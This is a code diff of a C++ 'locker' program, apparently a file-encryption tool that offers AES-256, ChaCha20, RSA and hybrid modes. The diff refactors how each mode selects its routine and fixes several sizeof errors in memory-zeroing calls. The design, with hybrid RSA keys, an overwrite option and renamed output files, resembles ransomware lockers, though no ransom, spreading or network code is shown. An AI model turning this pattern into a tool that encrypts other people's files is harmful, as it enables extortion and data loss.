@@ -1,14 +1,14 @@
 #include "locker.h"
+#include "aes/aes256.h"
+#include "chacha20/ecrypt-sync.h"
 #include "filesystem.h"
 #include "memory.h"
 #include "logs.h"
 
 
 #include <stdio.h>
-#include <cstdint>
-#include <string>
 #include "CommandParser.h"
-#include "rsa/rsa.h"
+
 
 static bool isCrypt = false;
 constexpr unsigned MB = 1048576;
@@ -29,7 +29,7 @@ static void HandlerGenKeyChaCha(laced_ctx* CryptCtx, CONST BYTE* ChaChaKey, CONS
 #ifdef _WIN32
 	RtlSecureZeroMemory(CryptCtx, sizeof(CryptCtx));
 #else
-	memory::memzero_explicit(CryptCtx, sizeof(CryptCtx));
+	memory::memzero_explicit(CryptCtx, sizeof(laced_ctx));
 #endif
 	ECRYPT_keysetup(CryptCtx, ChaChaKey, 256, 64);
 	ECRYPT_ivsetup(CryptCtx, ChaChaIV);
@@ -40,7 +40,7 @@ static void HandlerGenKeyAES(crypto_aes_ctx* CryptCtx, CONST BYTE* AESKey)
 #ifdef _WIN32
 	RtlSecureZeroMemory(CryptCtx, sizeof(CryptCtx));
 #else
-	memory::memzero_explicit(CryptCtx, sizeof(CryptCtx));
+	memory::memzero_explicit(CryptCtx, sizeof(crypto_aes_ctx));
 #endif
 	aes_expandkey(CryptCtx, AESKey);
 }
@@ -87,6 +87,19 @@ static bool RSAOnlyMethodState(PFILE_INFO FileInfo)
 	return true;
 }
 
+EncryptAlgoMethod init_hybrid()
+{
+	if (GLOBAL_ENUM.g_DeCrypt == EncryptCipher::CRYPT)
+		return (EncryptAlgoMethod)HybridMethodStateCrypt;
+	else if (GLOBAL_ENUM.g_DeCrypt == EncryptCipher::DECRYPT)
+		return (EncryptAlgoMethod)HybridMethodStateDecrypt;
+	else
+	{
+		LOG_ERROR("[GeneratePolicy] Failed; missing crypt/decrypt");
+		return NULL;
+	}
+}
+
 void locker::CryptoSystemInit(CRYPTO_SYSTEM* sys)
 {
 	sys->alg[0] =
@@ -96,7 +109,8 @@ void locker::CryptoSystemInit(CRYPTO_SYSTEM* sys)
 		.method_policy = CryptoPolicy::AES256,
 		.gen_policy = GENKEY_ONCE,
 		.crypt_method = (EncryptMethodFunc)aes_block_fn,
-		.gen_key_method = (EncryptGenKeyFunc)HandlerGenKeyAES
+		.gen_key_method = (EncryptGenKeyFunc)HandlerGenKeyAES,
+		.algo_method = (EncryptAlgoMethod)SymmetricMethodState
 	};
 
 	sys->alg[1] =
@@ -106,7 +120,8 @@ void locker::CryptoSystemInit(CRYPTO_SYSTEM* sys)
 		.method_policy = CryptoPolicy::CHACHA,
 		.gen_policy = GENKEY_EVERY_ONCE,
 		.crypt_method = (EncryptMethodFunc)chacha_block_fn,
-		.gen_key_method = (EncryptGenKeyFunc)HandlerGenKeyChaCha
+		.gen_key_method = (EncryptGenKeyFunc)HandlerGenKeyChaCha,
+		.algo_method = (EncryptAlgoMethod)SymmetricMethodState
 	};
 
 	sys->alg[2] =
@@ -116,7 +131,8 @@ void locker::CryptoSystemInit(CRYPTO_SYSTEM* sys)
 		.method_policy = CryptoPolicy::RSA_AES256,
 		.gen_policy = GENKEY_EVERY_ONCE,
 		.crypt_method = (EncryptMethodFunc)aes_block_fn,
-		.gen_key_method = (EncryptGenKeyFunc)HandlerGenKeyAES
+		.gen_key_method = (EncryptGenKeyFunc)HandlerGenKeyAES,
+		.algo_method = (EncryptAlgoMethod)init_hybrid
 	};
 
 	sys->alg[3] =
@@ -126,7 +142,8 @@ void locker::CryptoSystemInit(CRYPTO_SYSTEM* sys)
 		.method_policy = CryptoPolicy::RSA_CHACHA,
 		.gen_policy = GENKEY_EVERY_ONCE,
 		.crypt_method = (EncryptMethodFunc)chacha_block_fn,
-		.gen_key_method = (EncryptGenKeyFunc)HandlerGenKeyChaCha
+		.gen_key_method = (EncryptGenKeyFunc)HandlerGenKeyChaCha,
+		.algo_method = (EncryptAlgoMethod)init_hybrid
 	};
 
 	sys->alg[4] =
@@ -136,7 +153,8 @@ void locker::CryptoSystemInit(CRYPTO_SYSTEM* sys)
 		.method_policy = CryptoPolicy::RSA,
 		.gen_policy = NONE,
 		.crypt_method = NULL,
-		.gen_key_method = NULL
+		.gen_key_method = NULL,
+		.algo_method = (EncryptAlgoMethod)RSAOnlyMethodState
 	};
 
 	sys->num = 5;
@@ -233,6 +251,11 @@ bool locker::GeneratePolicy(CRYPT_INFO* CryptInfo)
 	if (!CryptSystemGetMethod(&sys, GLOBAL_ENUM.g_EncryptMethod, CryptInfo))
 		return false;
 
+	if(CryptInfo->algo_method == NULL)
+	{
+		LOG_ERROR("[GeneratePolicy] miss algorithm method");
+		return false;
+	}
 
 	if (GLOBAL_OVERWRITE.g_OverWrite)
 	{
@@ -297,8 +320,6 @@ bool locker::GeneratePolicy(CRYPT_INFO* CryptInfo)
 	if (state_crypt == EncryptCipher::CRYPT) isCrypt = true;
 	EncryptModes state_mode = GLOBAL_ENUM.g_EncryptMode;
 
-
-
 	if (CryptInfo->method_policy == CryptoPolicy::AES256
 		|| CryptInfo->method_policy == CryptoPolicy::RSA_AES256)
 	{
@@ -347,32 +368,6 @@ bool locker::GeneratePolicy(CRYPT_INFO* CryptInfo)
 			LOG_ERROR("[ReadRSAFile] Failed; " log_str, CryptInfo->desc.rsa_path);
 			return false;
 		}
-	}
-
-	if (CryptInfo->method_policy == CryptoPolicy::AES256 || CryptInfo->method_policy == CryptoPolicy::CHACHA)
-	{
-		CryptInfo->algo_method = (EncryptAlgoMethod)SymmetricMethodState;
-	}
-	else if (CryptInfo->method_policy == CryptoPolicy::RSA_AES256 || CryptInfo->method_policy == CryptoPolicy::RSA_CHACHA)
-	{
-		if (state_crypt == EncryptCipher::CRYPT)
-			CryptInfo->algo_method = (EncryptAlgoMethod)HybridMethodStateCrypt;
-		else if (state_crypt == EncryptCipher::DECRYPT)
-			CryptInfo->algo_method = (EncryptAlgoMethod)HybridMethodStateDecrypt;
-		else
-		{
-			LOG_ERROR("[GeneratePolicy] Failed; missing crypt/decrypt");
-			return false;
-		}
-	}
-	else if (CryptInfo->method_policy == CryptoPolicy::RSA)
-	{
-		CryptInfo->algo_method = (EncryptAlgoMethod)RSAOnlyMethodState;
-	}
-	else
-	{
-		LOG_ERROR("[GeneratePolicy] Failed; missing algorithm method");
-		return false;
 	}
 
 	switch (state_mode)
@@ -519,7 +514,7 @@ void locker::free_file_info(PFILE_INFO FileInfo, bool success)
 	
 	memory::m_free(FileInfo->newFilename);
 	if (FileInfo->CryptInfo->gen_policy == GENKEY_EVERY_ONCE && FileInfo->ctx) memory::m_free(FileInfo->ctx);
-	memory::memzero_explicit(FileInfo, sizeof(FileInfo));
+	memory::memzero_explicit(FileInfo, sizeof(FILE_INFO));
 }
 
 bool locker::HandlerCrypt
